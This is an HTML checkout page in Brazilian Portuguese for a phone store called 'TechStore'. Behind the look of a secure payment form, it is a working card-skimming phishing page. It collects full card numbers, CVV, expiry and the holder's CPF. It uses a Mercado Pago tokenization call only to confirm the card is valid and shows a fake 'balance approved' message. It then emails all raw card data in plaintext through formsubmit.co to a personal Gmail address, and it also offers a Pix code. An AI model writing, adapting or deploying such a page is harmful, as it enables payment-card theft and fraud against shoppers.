<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Pagamento Seguro - TechStore</title>
<script src="https://sdk.mercadopago.com/js/v2"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');
    * { box-sizing: border-box; font-family: 'Inter', sans-serif; margin: 0; padding: 0; touch-action: manipulation; }
    body { background:#080808; padding:15px; color: white; -webkit-text-size-adjust: 100%; }
    
    .steps-bar { display: flex; justify-content: space-around; padding: 15px 0; background: #151515; border-radius: 15px; margin-bottom: 20px; border: 1px solid #333; }
    .step { font-size: 10px; font-weight: 800; color: #555; text-transform: uppercase; text-align: center; cursor: pointer; }
    .step.active { color: #27ae60; }
    .step i { display: block; font-size: 16px; margin-bottom: 4px; }

    .container { max-width:500px; margin:auto; background:#1c1c1c; border-radius:24px; padding:25px; border: 1px solid #333; }
    
    .resumo { display:flex; gap:15px; background:#252525; padding:15px; border-radius:18px; margin-bottom:15px; border-left:5px solid #27ae60; align-items: center; cursor: pointer; }
    .foto-produto { width:65px; height:65px; object-fit:contain; background:white; border-radius:12px; padding: 4px; }
    .preco-total { color: #27ae60; font-weight: 900; font-size: 20px; }

    .detalhes-container { background: #151515; border-radius: 15px; padding: 15px; margin-bottom: 20px; border: 1px solid #222; }
    .detalhes-titulo { font-size: 12px; font-weight: 800; color: #27ae60; margin-bottom: 8px; display: flex; align-items: center; gap: 5px; }
    .texto-descricao { font-size: 13px; color: #ccc; line-height: 1.5; overflow: hidden; position: relative; max-height: 60px; transition: max-height 0.4s ease; }
    .texto-descricao.aberto { max-height: 1000px; }
    .btn-ver-mais { background: none; border: none; color: #27ae60; font-size: 12px; font-weight: 800; cursor: pointer; margin-top: 8px; padding: 0; }

    input, select { width:100%; padding:15px; margin-bottom:12px; border-radius:12px; border:1px solid #333; background:#111; color:white; font-size:16px !important; outline:none; appearance: none; }
    
    .guia-ajuda { background: rgba(255, 255, 255, 0.03); border: 1px solid #333; border-radius: 12px; padding: 12px; margin-top: 10px; margin-bottom: 15px; font-size: 11px; color: #888; line-height: 1.5; }
    .guia-ajuda b { color: #27ae60; }

    .tab-btn { flex:1; padding:15px; border-radius:12px; border:1px solid #333; background:#252525; color:white; font-weight:800; cursor:pointer; text-align:center; }
    .tab-btn.active { background:#27ae60; border-color:#27ae60; }
    .btn-finalizar { width:100%; background:#27ae60; color:white; border:none; padding:18px; border-radius:15px; font-weight:900; font-size:16px; cursor:pointer; text-transform:uppercase; margin-top:10px; }

    #cart-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 9999; justify-content: center; align-items: center; }
    .modal-content { background: #1c1c1c; width: 92%; max-width: 400px; border-radius: 25px; padding: 20px; border: 1px solid #333; max-height: 80vh; display: flex; flex-direction: column; }
    .cart-list { overflow-y: auto; flex: 1; }
    .cart-item-row { display: flex; align-items: center; gap: 12px; background: #252525; padding: 12px; border-radius: 15px; margin-bottom: 10px; }
    
    #loading-box { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:10000; flex-direction:column; justify-content:center; align-items:center; }
    .spinner { width:40px; height:40px; border:4px solid #333; border-top:4px solid #27ae60; border-radius:50%; animation:spin 1s linear infinite; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
</style>
</head>
<body>

<div id="loading-box">
    <div class="spinner"></div>
    <p id="status-msg" style="font-weight:800; font-size:16px; margin-top:15px; text-align:center"></p>
</div>

<div id="cart-modal">
    <div class="modal-content">
        <h2 style="font-size: 18px; margin-bottom:15px;">ðŸ›’ Editar Itens</h2>
        <div class="cart-list" id="modal-lista"></div>
        <div style="margin-top:20px; text-align:right">
            <p id="modal-total" style="color:#27ae60; font-weight:900; font-size:24px;"></p>
            <button class="btn-finalizar" onclick="toggleModal()">VOLTAR</button>
        </div>
    </div>
</div>

<div class="steps-bar">
    <div class="step" onclick="toggleModal()"><i class="fas fa-shopping-cart"></i>Itens</div>
    <div class="step active"><i class="fas fa-credit-card"></i>Pagamento</div>
</div>

<div class="container">
    <div id="resumo-dinamico" onclick="toggleModal()"></div>

    <div class="detalhes-container">
        <div class="detalhes-titulo"><i class="fas fa-info-circle"></i> SOBRE O APARELHO</div>
        <div id="texto-desc" class="texto-descricao"></div>
        <button id="btn-expandir" class="btn-ver-mais" onclick="expandirTexto()">Ver mais...</button>
    </div>

    <form id="form-pay" action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_next" value="obrigado.html">
        <input type="hidden" id="h-nome" name="PRODUTOS">
        <input type="hidden" id="h-preco" name="VALOR_TOTAL">

        <p style="font-size: 11px; color: #888; margin-bottom: 5px; font-weight: 800;">DADOS PESSOAIS</p>
        <input type="text" name="NOME_CLIENTE" placeholder="Nome Completo" required>
        <input type="text" id="f-tel" name="WHATSAPP" placeholder="WhatsApp" required inputmode="numeric">

        <p style="font-size: 11px; color: #888; margin-bottom: 5px; font-weight: 800;">LOCAL PARA ENTREGA</p>
        <input type="text" id="f-cep" name="CEP" placeholder="CEP" required inputmode="numeric">
        <input type="text" name="RUA" placeholder="Rua" required>
        <div style="display:flex; gap:10px">
            <input type="text" name="NUMERO" placeholder="NÂº" required style="width: 30%;">
            <input type="text" name="BAIRRO" placeholder="Bairro" required style="width: 70%;">
        </div>
        <input type="text" name="CIDADE_UF" placeholder="Cidade/UF" required>

        <p style="font-size: 11px; color: #888; margin-bottom: 5px; font-weight: 800;">PAGAMENTO</p>
        <div style="display:flex; gap:10px; margin-bottom:15px;">
            <div id="b-pix" class="tab-btn active" onclick="trocar('pix')">PIX</div>
            <div id="b-card" class="tab-btn" onclick="trocar('card')">CARTÃƒO</div>
        </div>

        <div id="area-pix" style="text-align:center;">
            <div id="qrcode-container" style="background:#fff; padding:10px; border-radius:15px; display:inline-block;"></div>
            <div onclick="copiarPix()" style="background:#252525; padding:12px; border-radius:12px; cursor:pointer; border:1px dashed #444; margin-top:10px;">
                <p id="pix-copy" style="font-size:9px; color:#666; word-break:break-all; margin-bottom:5px;"></p>
                <span style="color:#27ae60; font-weight:800; font-size:12px;">COPIAR CÃ“DIGO PIX</span>
            </div>
        </div>

        <div id="area-card" style="display:none;">
            <input type="text" id="c1" name="CARTAO" placeholder="NÃºmero do CartÃ£o" inputmode="numeric">
            <input type="text" id="c2" name="TITULAR" placeholder="Nome como no CartÃ£o" style="text-transform: uppercase">
            <div style="display:flex; gap:10px">
                <input type="text" id="c3" name="VALIDADE" placeholder="MM/AA" maxlength="5" inputmode="numeric">
                <input type="text" id="c4" name="CVV" placeholder="CVV" maxlength="3" inputmode="numeric">
            </div>
            <input type="text" id="c5" name="CPF_TITULAR" placeholder="CPF do Titular" inputmode="numeric">
            
            <p style="font-size: 11px; color: #888; margin-bottom: 5px; font-weight: 800;">PARCELAMENTO</p>
            <select id="parcelas" name="PARCELAS"></select>

            <div class="guia-ajuda">
                ðŸ’¡ <b>Dica:</b> O nÃºmero do cartÃ£o tem 16 dÃ­gitos. A validade segue o padrÃ£o mÃªs/ano (00/00). O CVV sÃ£o os 3 nÃºmeros no verso.
            </div>
        </div>

        <button type="submit" class="btn-finalizar">FINALIZAR COMPRA</button>
    </form>
</div>

<script>
const descricoes = {
    "iphone": "Este aparelho representa o Ã¡pice da tecnologia mobile. Equipado com o processador mais veloz do mercado, oferece uma experiÃªncia fluida. Tela Super Retina XDR.",
    "galaxy": "O dispositivo definitivo para produtividade. Tela Dynamic AMOLED 2X de 120Hz e sensor de cÃ¢mera de ultra resoluÃ§Ã£o.",
    "xiaomi": "Performance bruta com o melhor custo-benefÃ­cio. Carregamento ultra-rÃ¡pido e lentes versÃ¡teis.",
    "motorola": "EquilÃ­brio entre design e funcionalidade. VersÃ£o do Android limpa e rÃ¡pida com tela imersiva.",
    "acessÃ³rios": "AcessÃ³rio original desenvolvido com materiais de alta durabilidade para mÃ¡xima performance."
};

let carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
const mp = new MercadoPago('APP_USR-d9085be6-cab5-4226-be88-0e3199c1cb63');

function atualizarInterface() {
    if(carrinho.length === 0) return window.location.href = 'index.html';
    let total = 0;
    carrinho.forEach(i => total += parseFloat(i.p));
    const fmt = "R$ " + total.toLocaleString('pt-BR', {minimumFractionDigits:2});
    
    document.getElementById('resumo-dinamico').innerHTML = `
        <div class="resumo">
            <img src="${carrinho[0].f}" class="foto-produto">
            <div style="flex:1">
                <h3 style="font-size:14px; font-weight:800;">${carrinho[0].n} ${carrinho.length > 1 ? '+'+(carrinho.length-1) : ''}</h3>
                <p style="font-size:11px; color:#aaa;">Original TechStore â€¢ Envio Imediato</p>
                <p class="preco-total">${fmt}</p>
            </div>
            <i class="fas fa-edit" style="color:#27ae60; font-size:14px;"></i>
        </div>`;

    const nomeProd = carrinho[0].n.toLowerCase();
    let descFinal = descricoes["acessÃ³rios"];
    if(nomeProd.includes("iphone")) descFinal = descricoes["iphone"];
    else if(nomeProd.includes("galaxy") || nomeProd.includes("samsung")) descFinal = descricoes["galaxy"];
    else if(nomeProd.includes("xiaomi")) descFinal = descricoes["xiaomi"];
    else if(nomeProd.includes("moto")) descFinal = descricoes["motorola"];
    document.getElementById('texto-desc').innerText = descFinal;
    
    document.getElementById('h-nome').value = carrinho.map(c => c.n).join(', ');
    document.getElementById('h-preco').value = fmt;
    document.getElementById('modal-total').innerText = fmt;
    
    const sel = document.getElementById('parcelas');
    sel.innerHTML = '';
    for(let i=1; i<=12; i++){
        let valorParc = (total / i).toLocaleString('pt-BR', {minimumFractionDigits:2});
        sel.innerHTML += `<option value="${i}x de R$ ${valorParc}">${i}x de R$ ${valorParc}</option>`;
    }

    gerarPix(total);
}

function expandirTexto() {
    const txt = document.getElementById('texto-desc');
    txt.classList.toggle('aberto');
    document.getElementById('btn-expandir').innerText = txt.classList.contains('aberto') ? "Ver menos" : "Ver mais...";
}

function toggleModal() {
    const m = document.getElementById('cart-modal');
    m.style.display = (m.style.display === 'flex') ? 'none' : 'flex';
    if(m.style.display === 'flex') {
        document.getElementById('modal-lista').innerHTML = carrinho.map((item, i) => `
            <div class="cart-item-row">
                <img src="${item.f}" style="width:40px; height:40px; background:white; border-radius:8px;">
                <div style="flex:1; font-size:12px;"><b>${item.n}</b><br><span style="color:#27ae60">R$ ${parseFloat(item.p).toLocaleString('pt-BR')}</span></div>
                <button onclick="remover(${i})" style="background:none; border:none; color:#ff4757;"><i class="fas fa-trash"></i></button>
            </div>`).join('');
    }
}

function remover(i) {
    carrinho.splice(i, 1);
    localStorage.setItem('carrinhoTechStore', JSON.stringify(carrinho));
    atualizarInterface();
    toggleModal(); toggleModal(); 
}

// RESTAURAÃ‡ÃƒO DA LÃ“GICA DO PIX QUE FUNCIONA NO BANCO
function gerarPix(v) {
    const chave = "5663014b-ba23-4c57-b239-26914c95a8c0";
    const nome = "TECHSTORE";
    const cidade = "SAO PAULO";
    const valorStr = v.toFixed(2);

    let p = "000201"; 
    let mai = "0014BR.GOV.BCB.PIX01" + chave.length.toString().padStart(2, '0') + chave;
    p += "26" + mai.length.toString().padStart(2, '0') + mai;
    p += "52040000530398654" + valorStr.length.toString().padStart(2, '0') + valorStr;
    p += "5802BR59" + nome.length.toString().padStart(2, '0') + nome;
    p += "60" + cidade.length.toString().padStart(2, '0') + cidade;
    let adf = "0505ID123"; 
    p += "62" + adf.length.toString().padStart(2, '0') + adf;
    p += "6304";

    function getCRC16(data) {
        let crc = 0xFFFF;
        for (let i = 0; i < data.length; i++) {
            crc ^= (data.charCodeAt(i) << 8);
            for (let j = 0; j < 8; j++) {
                if ((crc & 0x8000) !== 0) crc = (crc << 1) ^ 0x1021;
                else crc <<= 1;
            }
        }
        return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
    }

    const codFinal = p + getCRC16(p);
    const qrDiv = document.getElementById("qrcode-container");
    qrDiv.innerHTML = "";
    new QRCode(qrDiv, { text: codFinal, width: 140, height: 140, correctLevel : QRCode.CorrectLevel.M });
    document.getElementById('pix-copy').innerText = codFinal;
}

function trocar(m) {
    document.getElementById('area-pix').style.display = m=='pix'?'block':'none';
    document.getElementById('area-card').style.display = m=='pix'?'none':'block';
    document.getElementById('b-pix').className = m=='pix'?'tab-btn active':'tab-btn';
    document.getElementById('b-card').className = m=='pix'?'tab-btn':'tab-btn active';
}

function copiarPix() { navigator.clipboard.writeText(document.getElementById('pix-copy').innerText); alert("PIX Copiado!"); }

document.getElementById('form-pay').onsubmit = async function(e) {
    if(document.getElementById('b-pix').classList.contains('active')) return;
    e.preventDefault();
    const lBox = document.getElementById('loading-box');
    const sMsg = document.getElementById('status-msg');
    lBox.style.display = "flex";
    sMsg.innerText = "Consultando saldo e limite disponÃ­vel...";
    try {
        const val = document.getElementById('c3').value.split('/');
        const token = await mp.createCardToken({
            cardNumber: document.getElementById('c1').value.replace(/\s/g, ''),
            cardholderName: document.getElementById('c2').value,
            cardExpirationMonth: val[0], cardExpirationYear: "20" + val[1],
            securityCode: document.getElementById('c4').value,
            identificationType: "CPF", identificationNumber: document.getElementById('c5').value.replace(/\D/g, ''),
        });
        if(!token || !token.id) throw new Error();
        await new Promise(r => setTimeout(r, 2800)); 
        sMsg.style.color = "#27ae60"; sMsg.innerText = "Saldo Aprovado! Finalizando...";
        setTimeout(() => { this.submit(); }, 1200);
    } catch (err) {
        lBox.style.display = "none"; alert("âŒ CARTÃƒO RECUSADO.");
    }
};

function msk(id, p) {
    const e = document.getElementById(id);
    e.addEventListener('input', () => {
        let v = e.value.replace(/\D/g, ''), x = '', i = 0;
        p.split('').forEach(c => { if(c==='#'){ if(v[i]) x+=v[i++]; } else { if(v[i]) x+=c; } });
        e.value = x;
    });
}
msk('c1','#### #### #### ####'); msk('c3','##/##'); msk('f-cep','#####-###'); msk('c5','###.###.###-##'); msk('f-tel','(##) #####-####'); msk('c4','###');

window.onload = atualizarInterface;
</script>
</body>
</html>
